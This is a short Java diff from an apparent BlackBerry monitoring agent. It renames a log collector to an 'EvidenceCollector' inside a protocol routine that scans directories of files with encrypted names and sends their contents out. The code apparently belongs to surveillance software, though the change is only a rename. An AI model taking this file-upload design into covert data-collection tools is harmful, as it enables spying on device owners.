@@ -20,10 +20,10 @@ import blackberry.crypto.Encryption;
 import blackberry.crypto.EncryptionPKCS5;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.EvidenceCollector;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Directory;
 import blackberry.fs.Path;
-import blackberry.log.LogCollector;
 import blackberry.transfer.CommandException;
 import blackberry.transfer.Proto;
 import blackberry.transfer.ProtocolException;
@@ -568,13 +568,13 @@ public class ZProtocol extends Protocol {
         debug.info("sending logs from: " + basePath);
         //#endif
 
-        LogCollector logCollector = LogCollector.getInstance();
+        EvidenceCollector logCollector = EvidenceCollector.getInstance();
 
         final Vector dirs = logCollector.scanForDirLogs(basePath);
         final int dsize = dirs.size();
         for (int i = 0; i < dsize; ++i) {
             final String dir = (String) dirs.elementAt(i);
-            final Vector logs = logCollector.scanForLogs(basePath, dir);
+            final Vector logs = logCollector.scanForEvidences(basePath, dir);
             final int lsize = logs.size();
             for (int j = 0; j < lsize; ++j) {
                 final String logName = (String) logs.elementAt(j);
@@ -588,7 +588,7 @@ public class ZProtocol extends Protocol {
                 }
                 final byte[] content = file.read();
                 //#ifdef DEBUG
-                debug.info("Sending file: " + LogCollector.decryptName(logName)
+                debug.info("Sending file: " + EvidenceCollector.decryptName(logName)
                         + " = " + fullLogName);
                 //#endif
 
